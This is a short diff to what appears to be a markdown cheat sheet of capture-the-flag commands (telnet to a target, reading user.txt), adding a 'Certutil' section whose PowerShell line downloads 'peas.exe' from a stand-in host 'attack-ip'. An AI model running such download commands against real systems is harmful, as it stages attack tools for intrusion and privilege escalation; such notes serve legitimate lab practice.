@@ -65,3 +65,9 @@ cat "Access Control.mbox"
 telnet $IP 23
 cat Desktop/user.txt
 ```
+
+## Certutil
+
+```Powershell
+certutil -urlcache -split -f http://attack-ip peas.exe
+```
